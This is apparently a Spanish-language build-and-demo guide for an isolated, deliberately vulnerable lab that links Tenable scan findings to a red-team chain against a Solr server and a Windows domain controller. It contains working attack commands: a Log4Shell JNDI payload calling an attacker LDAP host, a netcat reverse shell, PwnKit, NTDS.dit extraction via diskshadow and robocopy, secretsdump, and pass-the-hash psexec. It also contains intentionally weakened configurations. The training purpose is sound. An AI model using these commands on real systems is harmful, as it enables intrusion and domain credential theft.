# Bifrost — Guía maestra

> **Del hallazgo al dominio.** El escáner no explota, *prioriza*. El red team no
> adivina, *valida*. Bifrost es el puente entre lo que Tenable reporta y lo que
> realmente se puede ejecutar.

Esta es **la única guía**: cubre el diseño, la construcción paso a paso y la
explotación, en orden. Los valores (IPs, dominio, puertos, credenciales) viven en
[config/lab.env](config/lab.env) y no se repiten aquí salvo como referencia.

---

## 1. Qué construyes

| Host | Sistema | Rol en la cadena | IP (default) |
|---|---|---|---|
| **host** | ParrotOS (tu PC) | **atacante + control** | `BIFROST_IP_ATTACKER` · `.66` |
| `scanner` | Ubuntu + Nessus | escáner enlazado a Tenable One | `.10` |
| `web01` | Ubuntu 20.04 | Solr (Log4Shell) + PwnKit + credenciales | `.20` |
| `dc01` | Windows Server 2019 | AD DS + Backup Operators (NTDS.dit) | `.30` |

**El atacante eres tú, desde el host** a través de la interfaz host-only (VMnet1).
No hay máquina Kali: simplifica la implementación y evita la fricción de Kali en
VMware.

### La cadena (4 puentes, 2 máquinas objetivo)

1. **Log4Shell** → shell como `solr` en `web01`.
2. **Privesc** → credenciales de `svc_app` en la config del core → `su svc_app` → **PwnKit** → `root` en `web01`.
3. **Credenciales** → `svc_backup` en `/opt/app/config.yml` → credencial de dominio válida.
4. **Backup Operators** → `svc_backup` en `Backup Operators` + RDP al DC → `NTDS.dit` → **Domain Admin**.

---

### Direccionamiento, gateway y DNS

Red **host-only** `10.10.0.0/24`: sin router ni salida a internet.

| Máquina | IP | Gateway | DNS |
|---|---|---|---|
| host (atacante) | `10.10.0.66` | **ninguno** | sin cambios (usa su DNS normal) |
| scanner | `10.10.0.10` | ninguno (la NIC NAT da el suyo por DHCP) | `10.10.0.30` (opcional) |
| web01 | `10.10.0.20` | **ninguno** | `10.10.0.30` (dc01) |
| dc01 | `10.10.0.30` | ninguno | `127.0.0.1` (él mismo) |

**Claves para no confundirte:**

- **Gateway = ninguno.** Es una red aislada: nada rutea hacia fuera, así que no
  hace falta default gateway. En Linux (netplan) se omite el bloque `routes`; en
  Windows, `New-NetIPAddress` acepta IP sin gateway. Si algún campo lo exige,
  pon `10.10.0.1`: es un valor nominal, no rutea nada.
- **La IP del atacante NO tiene que ser `.1`.** El `.1` es solo la convención con
  la que VMware asigna el adaptador del host (VMnet1). En host-only el host puede
  estar en cualquier IP libre del segmento (aquí `.66`). Solo evita chocar con
  `.10/.20/.30`.
- **DNS**: `dc01` es el DNS del dominio. `web01` apunta a él; `dc01`
  apunta a sí mismo (`127.0.0.1`). El host y el scanner no lo necesitan en VMnet1
  (el scanner obtiene el suyo por la NIC NAT).

---

## 2. Requisitos

| Requisito | Mínimo | Recomendado |
|---|---|---|
| Hipervisor | VMware Workstation Pro 17.x (Linux/Windows) | ídem |
| Host atacante | ParrotOS (o cualquier Debian con las herramientas) | ParrotOS |
| Red host-only | un adaptador `vmnet` | ídem |
| RAM | 14 GB | 32 GB |
| Disco | 60 GB | 120 GB |
| Python | 3.8 + `requests` | 3.10+ |

> **Fusion 13.x en Mac Intel** también sirve, pero **Apple Silicon no puede correr
> `dc01`** (es x86). En Windows, excluye la carpeta de VMs del antivirus.

---

## 3. Valores y configuración

`config/lab.env` es la **única fuente de verdad**. La leen `bifrost.sh`/`bifrost.ps1`,
`provision/*.sh`, `exploits/*/*.sh`, `tenable_scan.py` y `windows/*.ps1`.

```bash
# ver los valores efectivos (secretos enmascarados)
./bifrost.sh config                  # Linux/macOS
.\bifrost.ps1 config                 # Windows
python tenable/tenable_scan.py --action config
```

Verificación del contrato (sin valores duplicados, motores alineados):

```bash
bash tests/check-consistency.sh
```

Catálogo completo de claves en el **apéndice A**.

---

## 4. Paso a paso (secuencial)

Cada paso termina en un **gate**: no avances si falla.

### Paso 0 — Preparar el host

**En:** `host` (ParrotOS).

1. **Red host-only**: en VMware, crea `VMnet1` host-only, subred = `BIFROST_NETWORK/PREFIX`, sin DHCP.
2. Asigna a tu interfaz host-only la IP del atacante:

```bash
sudo ip addr add 10.10.0.66/24 dev vmnet1   # ajusta interfaz e IP a config/lab.env
ip -br a | grep 10.10.0.66                   # confirma
```

   `10.10.0.1` es solo la IP que VMware pone por defecto en `vmnet1`; el
   atacante va en `.66`, que es el valor de `lab.env` y del selftest.

   Si el host tiene **ufw activo** (Parrot lo trae activo con `deny incoming`),
   permite el tráfico del laboratorio: LDAP, HTTP del payload, probe, reverse
   shell y relay SMB.

```bash
for p in 1389 8000 9998 4444 445; do
  sudo ufw allow from 10.10.0.0/24 to any port "$p" proto tcp
done
```

   Y para que `certipy` no dependa del DNS del host:

```bash
echo '10.10.0.30 DC01.corp.local corp.local' | sudo tee -a /etc/hosts
```

3. Preflight y contrato:

```bash
./bifrost.sh preflight
bash tests/check-consistency.sh
```

4. Herramientas del atacante:

```bash
bash provision/attacker-tools.sh
```

**Gate 0:** `entorno listo` + `contrato de estandarizacion OK`.

### Paso 1 — scanner

**En:** `VMware GUI` + `scanner` + `Tenable UI`.

1. Crea la VM (2 NIC: VMnet1 = `.10` + NAT para enlazar a la nube). Esta NAT **se queda**.
2. Despliega Nessus (OVA oficial) o Ubuntu + `dpkg -i Nessus-*.deb`.
3. En **Tenable One**: *Settings → Scanners → Add Scanner → Nessus Scanner* → copia la **Linking Key**.
4. En la consola del scanner:

```bash
sudo nessuscli managed link --key=<KEY> --cloud
```

5. Política: *Policies → New Policy → Basic Network Scan*, nombre **`Bifrost-Demo`**:
   - **Credentials → SSH**: usuario `bifrost`, su contraseña y `sudo` a `root`
     (la cuenta usa `NOPASSWD`; el sudo password puede quedar vacío). Para el
     escaneo credenciado de Linux hay que abrir el 22 temporalmente (ver paso 2);
     el Log4Shell se detecta igual sin credenciales.
   - **Credentials → Windows**: usuario `Administrator`, **Domain `CORP`**,
     contraseña `Bifrost-Admin-2026!`, **SMB + WMI**. No uses
     `CORP\Administrator` con Domain vacío: el `smb_login` de Nessus falla.
     Marca además *Start the Remote Registry service during the scan* y
     *Enable administrative shares during the scan*.
   - **Plugins**: se habilitan por **familias** (no plugin a plugin). Deja
     **Web Servers** (Log4Shell/Solr), **Ubuntu Local Security Checks** y las de
     **Windows**; puedes desactivar las familias que no aplican para acelerar.
6. API keys: *Settings → My Account → API Keys → Generate*, guárdalas en `~/.bifrost/tenable.json`.

**Gate 1** (en `host`):

```bash
python tenable/tenable_scan.py --action scanners     # status=connected
python tenable/tenable_scan.py --action policies     # existe Bifrost-Demo
```

### Paso 2 — web01

**En:** `VMware GUI` (crear) + consola de `web01` (instalar) + `host` (provisionar).

1. VM Ubuntu Server **20.04** (importante: es la versión con `policykit 0.105`), 2 vCPU / 3 GB / 20 GB, red VMnet1, **NIC NAT activa solo para construir**.
2. Instala con usuario `bifrost` + OpenSSH y `open-vm-tools`. IP estática por netplan (sin gateway, DNS = dc01):

```yaml
# /etc/netplan/00-bifrost.yaml   (cambia ens33 por tu interfaz real: 'ip -br a')
network:
  version: 2
  ethernets:
    ens33:
      dhcp4: false
      addresses: [10.10.0.20/24]
      nameservers:
        addresses: [10.10.0.30]   # dc01
```

```bash
sudo chmod 600 /etc/netplan/00-bifrost.yaml && sudo netplan apply
```

La NIC NAT (segunda interfaz) se configura sola por DHCP y es la que da internet
durante la construcción.
3. Provisiona desde el host:

```bash
bash provision/apply.sh web01
```

4. **PwnKit (puente 2)**. Aunque `policykit` sea viejo, hay dos trampas:

   - **Versión de policykit**: si `dpkg -s policykit-1` da `0.105-26ubuntu1.2`
     o superior (pasa si se aplicaron actualizaciones), baja a la del release y
     bloquéala:
     ```bash
     sudo apt-get install --allow-downgrades policykit-1=0.105-26ubuntu1 \
       libpolkit-agent-1-0=0.105-26ubuntu1 libpolkit-gobject-1-0=0.105-26ubuntu1
     sudo apt-mark hold policykit-1 libpolkit-agent-1-0 libpolkit-gobject-1-0
     ```
   - **Kernel**: PwnKit necesita `argc=0`. Desde 5.4.197 el kernel fuerza un
     `argv[0]` vacío (mitigación *argv=0*) y en 20.04 eso llega con los kernels
     actualizados (`5.4.0-124`+). Si `uname -r` no es el del release
     (`5.4.0-26`), arráncalo desde GRUB → *Advanced options* o reinstala sin
     actualizar. Sin esto, el exploit imprime el `usage` de pkexec aunque
     `policykit` sea vulnerable. `web01-solr.sh` ya avisa de ambas cosas.

5. **SSH tras el provisioning**: `web01-solr.sh` deja ufw con solo el 8983, así
   que `apply.sh`/`ssh` desde el host dan timeout. Usa la consola de VMware; si
   necesitas SSH para depurar o para un escaneo credenciado:
   ```bash
   sudo ufw allow from 10.10.0.0/24 to any port 22 proto tcp
   ```
   quítalo antes del snapshot/demo.

6. **PwnKit sin internet** (la NAT se retira en el paso 6): deja el exploit
   compilado dentro de la VM.
   ```bash
   sudo apt-get install -y build-essential git
   sudo git clone https://github.com/berdav/CVE-2021-4034 /opt/pk
   sudo make -C /opt/pk
   ```
   En la demo, desde la shell de `solr`: `su svc_app` y
   `cd /opt/pk && ./cve-2021-4034`.

**Gate 2** (en `host`):

```bash
curl -s "http://10.10.0.20:8983/solr/admin/info/system?wt=json" | head -c 300
# debe contener "solr-spec-version":"8.11.0"
```

**Gate 3 — cadena Log4Shell completa** (en `host`):

```bash
cd exploits/log4shell && ./build.sh && ./selftest.sh
# RESULTADO: cadena completa OK
```

### Paso 3 — dc01

**En:** `VMware GUI` (crear) + consola de `dc01` (PowerShell admin).

1. VM Windows Server 2019, red VMnet1, 60 GB. Instala VMware Tools.
2. Copia `config\` y `windows\` a `C:\Bifrost\`.
3. Secuencia real (el script es multi-fase; relanza tras cada reinicio):

```powershell
.\dc01-promote.ps1    # red + rename -> reinicia
.\dc01-promote.ps1    # AD DS + promocion -> reinicia
.\dc01-promote.ps1    # OU/usuarios/corona -> "dc01 listo"
```

4. **Configura la vía de escalada (Backup Operators + RDP)** en el DC:

```powershell
Add-ADGroupMember -Identity 'Backup Operators' -Members svc_backup
Add-ADGroupMember -Identity 'Remote Desktop Users' -Members svc_backup
Set-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name fDenyTSConnections -Value 0
Enable-NetFirewallRule -DisplayGroup 'Remote Desktop'
```

> En un DC, el derecho **"Allow log on through Remote Desktop Services"**
> (`SeRemoteInteractiveLogonRight`) solo incluye a **Administrators**; el grupo
> `Remote Desktop Users` **no basta**. Añade `CORP\svc_backup` en
> `gpmc.msc` → **Default Domain Controllers Policy** → Edit → Computer
> Configuration → Policies → Windows Settings → Security Settings → Local
> Policies → User Rights Assignment → *Allow log on through Remote Desktop
> Services*; luego `gpupdate /force` en el DC.

> `svc_backup` es la cuenta de copias: en el DC queda en `Backup Operators`
> (`SeBackupPrivilege`, para leer `NTDS.dit`) y en `Remote Desktop Users` (para
> entrar por RDP y ejecutar `diskshadow`). Es la configuración que convierte una
> cuenta de servicio en la vía al `krbtgt`. ADCS/ESC8 ya no forma parte del
> flujo; `adcs-esc8.ps1` se conserva como legado.

**Gate 4** (en `dc01`):

```powershell
Get-ADDomain | Select-Object Name                    # corp.local
Get-ADGroupMember 'Backup Operators' | Select-Object Name
Get-ADGroupMember 'Remote Desktop Users' | Select-Object Name
(Get-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Terminal Server').fDenyTSConnections  # 0
Test-Path C:\Corp\Finanzas                           # en la misma ventana elevada
```

```bash
nxc rdp "$TARGET_DC" -u "$BIFROST_SVC_USER" -p "$BIFROST_SVC_PASS"   # Pwn3d!
```

### Paso 4 — Prueba de humo del escaneo

**En:** `host` (API) o `Tenable UI` (visual).

```bash
python tenable/tenable_scan.py --action run --name "Bifrost smoke" --out out/smoke.nessus
```

**Alternativa por UI (sin API keys):** `cloud.tenable.com` → **Scans → New
Scan** → política `Bifrost-Demo` → targets `10.10.0.20,10.10.0.30`
→ scanner `10.10.0.10` → **Launch**. Al terminar, **Export → Nessus**.

**Gate 5:** termina `completed` y el resumen tiene un **Crítico** en
`BIFROST_IP_WEB` (Log4Shell, plugins 155999/156057; el 168496 es el RCE de
Solr en 8983).

Si exportas desde la UI, Tenable puede partir cada host en varios `ReportHost`
(bloques de ~100 hallazgos). El resumen offline los une:

```bash
python tenable/tenable_scan.py --action summary --file out/Bifrost_Smoke.nessus --out out/smoke.md
```

### Paso 5 — Snapshots y ensayo

1. **Retira la NIC NAT** de `web01` y el 22 temporal si lo abriste.

> Si ya no usas la VM de respaldo, borra/archiva su carpeta en `vms/`:
> `./bifrost.sh status` y `snapshot all` solo tocan las VMs presentes
> (scanner, web01, dc01). Comprueba
   que `ip -br a` solo tiene `10.10.0.20` y que `sudo ufw status` solo deja
   8983.
2. Apaga las VMs y toma los snapshots (el comando acepta la etiqueta):

```bash
./bifrost.sh stop all
./bifrost.sh snapshot all clean
./bifrost.sh snapshot all pre-demo    # después del ensayo
```

`pre-demo` es el que usa `reset`; no lo olvides.

**Gate final:** `./bifrost.sh reset all` deja todo idéntico a `pre-demo` en <60 s.

---

## 5. La cadena de ataque (comandos copy/paste)

> La versión **detallada, comando a comando, con la lógica del atacante y el
> speech para el escenario** está en [ATTACK.md](ATTACK.md). Aquí, lo esencial.

Todo desde el **host atacante**. Antes: `source ~/bifrost/env.sh`.

### Puente 1 — Log4Shell

```bash
# terminal 1: payload + servidor LDAP
cd exploits/log4shell
./build.sh
./ldap-serve.sh

# terminal 2: listener
nc -lvnp "$BIFROST_REVSHELL_PORT"

# terminal 3: el disparo (-g: si no, curl se come las llaves de ${...})
curl -g "http://$TARGET_WEB:$BIFROST_SOLR_PORT/solr/admin/cores?action=\${jndi:ldap://$LHOST:$BIFROST_LDAP_PORT/Exploit}"
```

En la shell recibida (usuario `solr` en `web01`): `id`, `hostname`.

### Puente 2 — Privesc (PwnKit)

En la shell de `web01`:

```bash
cat /opt/solr/server/solr/intranet/conf/db.properties    # -> svc_app / Bifrost2026!
su svc_app
cd /opt/pk && ./cve-2021-4034                           # precompilado, sin internet
id                                                       # uid=0(root)
```

Si no precompilaste `/opt/pk` (paso 2) y la VM todavía tiene red:
`git clone https://github.com/berdav/CVE-2021-4034 /tmp/pk && cd /tmp/pk && make && ./cve-2021-4034`.
El kernel debe ser el `5.4.0-26` (ver paso 2); con el `5.4.0-124`+ el `argc=0`
está mitigado y PwnKit imprime el `usage` de pkexec.

### Puente 3 — Credenciales de dominio (`svc_backup`)

En la shell de `web01` (root):

```bash
cat /opt/app/config.yml                                  # -> svc_backup / Verano2024!
```

De vuelta en el **host**, valida la credencial contra el DC:

```bash
nxc smb "$TARGET_DC" -u "$BIFROST_SVC_USER" -p "$BIFROST_SVC_PASS"
```

### Puente 4 — Backup Operators + NTDS.dit → Domain Admin

**RDP al DC como `svc_backup` (el DC exige NLA):**

```bash
xfreerdp3 /v:"$TARGET_DC" /u:'svc_backup' /d:'corp.local' /p:'Verano2024!' /cert:ignore /sec:nla \
  /drive:loot,/home/bard/bifrost/loot
```

**En el DC — `diskshadow` interactivo:**

```powershell
diskshadow
set context persistent nowriters
add volume c: alias ntds
create
expose %ntds% z:
exit
```

**Copiar `NTDS.dit` y `SYSTEM`:**

```powershell
robocopy /b z:\Windows\NTDS C:\Users\svc_backup ntds.dit
robocopy /b z:\Windows\System32\config C:\Users\svc_backup SYSTEM
```

**Exfiltrar al host como `svc_backup` y volcar:**

```powershell
copy C:\Users\svc_backup\ntds.dit \\tsclient\loot\ntds.dit
copy C:\Users\svc_backup\SYSTEM  \\tsclient\loot\SYSTEM
```

```bash
impacket-secretsdump -ntds /home/bard/bifrost/loot/ntds.dit \
  -system /home/bard/bifrost/loot/SYSTEM LOCAL
```

> Antes del `copy`, en el host: `chmod 777 /home/bard/bifrost/loot`.
> Alternativa sin RDP: `impacket-smbserver loot /home/bard/bifrost/loot -smb2support -username svc -password 'Verano2024!'`
> en el host y `copy` a `\\10.10.0.66\loot\...` desde el DC (sin credenciales el DC bloquea el guest).

> `robocopy /b` habilita `SeBackupPrivilege`; `reg save HKLM\SYSTEM` no lo hace y
> con `svc_backup` da `Access is denied`. Sin `SYSTEM` (`BootKey`) no se descifra.

**Cerrar sesión:**

```bash
impacket-psexec -hashes :<HASH_ADMIN> 'corp.local/Administrator@'"$TARGET_DC"
```

---

## 6. El directo (30 min)

| Min | Qué pasa | Quién / dónde |
|---|---|---|
| 00:00 | Hook + slide de arquitectura | tú (`host`) |
| 03:00 | Política, credenciales, triage VPR, Attack Path | Tenable (`Tenable UI`) |
| 08:00 | **Puente 1** Log4Shell | tú (`host`) |
| 12:00 | **Puente 2** privesc | tú (`host`) |
| 15:00 | **Puente 3** lateral | tú (`host`) |
| 19:00 | **Puente 4** ESC8 → DA | tú (`host`) |
| 24:00 | Impacto controlado (leer, no cifrar) | tú (`host`) |
| 26:00 | Blue team: 4624/4625, 4768/4769, 4886/4887, 4662 | Tenable (`Tenable UI`) |
| 29:00 | Cierre | ambos |

**Lanza el escaneo antes de entrar a la sala** (20 min).

---

## 7. Contingencias

| Qué falla | Qué haces |
|---|---|
| Una VM no arranca | `./bifrost.sh reset <vm>` |
| El escaneo tarda | muestra el `.nessus` pre-exportado |
| Puente 1: LDAP no devuelve shell | `selftest.sh`; si falla, clip grabado |
| Puente 2: PwnKit parcheado | usa `sudo -l` si hay misconfig, o clip |
| Puente 3: credencial inválida | revisa `/opt/app/config.yml` y `nxc smb` al DC |
| Puente 4: RDP no entra | `Remote Desktop Users` + `fDenyTSConnections=0`; `nxc rdp` |
| ZeroLogon deja el DC roto | snapshot + `reset all` |

**Frase comodín:** *"esto es exactamente lo que pasa en producción: el exploit no
siempre funciona a la primera. Se cambia de técnica y se sigue."*

---

## 8. Troubleshooting

| Dónde | Síntoma | Causa probable | Arreglo |
|---|---|---|---|
| `host` | preflight `bloqueante` por red | no hay vmnet | crear VMnet1 host-only |
| `host` | `apply.sh` no conecta | VM apagada / IP mal / ufw de web01 | `./bifrost.sh ip web01`; ver fila de SSH |
| `web01` | `web01-solr.sh` "sin internet" | falta NIC NAT de construcción | activarla, reejecutar |
| `web01` | `ssh`/`apply.sh` a web01 dan timeout | web01 ufw solo deja 8983 | consola de VMware o `ufw allow ... 22` temporal |
| `host` | `selftest.sh` FALLO sin conexión LDAP | `curl` sin `-g` se come las llaves de `${jndi:...}` | ya corregido en `selftest.sh`/`ldap-serve.sh`/GUIDE |
| `web01` | PwnKit imprime el `usage` de pkexec | kernel con mitigación *argv=0* (≥5.4.0-124) | arrancar el `5.4.0-26` desde GRUB |
| `web01` | `policykit-1` ≥ 0.105-26ubuntu1.2 | actualizaciones aplicadas | downgrade a `0.105-26ubuntu1` + `apt-mark hold` |
| `scanner` | `disconnected` | NIC NAT del scanner caída | `curl https://cloud.tenable.com` |
| `scanner` | credenciales Windows inválidas (104410) | `CORP\Administrator` con Domain vacío | usuario `Administrator`, domain `CORP`; Remote Registry/admin shares |
| `host` | escaneo sin Crítico | política sin credenciales/plugins | revisar política y familia Web Servers |
| `dc01` | `svc_backup` no puede RDP | no está en `Remote Desktop Users` o RDP apagado | `Add-ADGroupMember`; `fDenyTSConnections=0`; `Enable-NetFirewallRule 'Remote Desktop'` |
| `dc01` | `diskshadow`/`robocopy /b` da acceso denegado | falta `SeBackupPrivilege` | `Add-ADGroupMember 'Backup Operators'`; cierra sesión y vuelve a entrar |
| `host` | `secretsdump -ntds -system` no descifra | `SYSTEM` de otro DC o corrupto | copia el `SYSTEM` del mismo DC |
| `dc01` | Kerberos falla | reloj desincronizado | `w32tm /resync` |

---

## Apéndice A — Catálogo de valores

Claves de `config/lab.env`. Cambia ahí y en ningún otro sitio.

| Clave | Default | Uso |
|---|---|---|
| `BIFROST_VERSION` | `1.1.1` | informativo |
| `BIFROST_NETWORK` / `BIFROST_PREFIX` / `BIFROST_GATEWAY` | `10.10.0.0` / `24` / `.1` (nominal) | red aislada |
| `BIFROST_IP_ATTACKER` | `.66` | host atacante (VMnet1) |
| `BIFROST_IP_SCANNER` | `.10` | Nessus |
| `BIFROST_IP_WEB` | `.20` | web01 |
| `BIFROST_IP_DC` | `.30` | dc01 |
| `BIFROST_DOMAIN` / `BIFROST_NETBIOS` | `corp.local` / `CORP` | dominio |
| `BIFROST_DOMAIN_ADMIN` / `_PASS` | `Administrator` / `Bifrost-Admin-2026!` | union al dominio |
| `BIFROST_DSRM_PASS` | `Bifrost-DSRM-2026!` | modo restauracion |
| `BIFROST_SVC_USER` / `_PASS` | `svc_backup` / `Verano2024!` | puente 3 y 4 |
| `BIFROST_APP_USER` / `_PASS` | `svc_app` / `Bifrost2026!` | usuario local web01 |
| `BIFROST_SOLR_PORT` / `BIFROST_SOLR_VERSION` | `8983` / `8.11.0` | puente 1 |
| `BIFROST_LDAP_PORT` / `HTTP_PORT` / `REVSHELL_PORT` / `PROBE_PORT` | `1389` / `8000` / `4444` / `9998` | exploits |
| `BIFROST_VM_DIR` | `./vms` | carpeta de VMs |
| `BIFROST_SNAPSHOT` | `pre-demo` | snapshot de ensayo |
| `BIFROST_TENABLE_POLICY` | `Bifrost-Demo` | política de escaneo |
| `BIFROST_TENABLE_BASE_URL` / `_KEYS_FILE` | `cloud.tenable.com` / vacío | API |
| `BIFROST_CROWN_JEWEL` | `C:\Corp\Finanzas` | joya de la corona |

> Credenciales de la API de Tenable **no** van en `lab.env`: viven en
> `~/.bifrost/tenable.json` (fuera del repo).
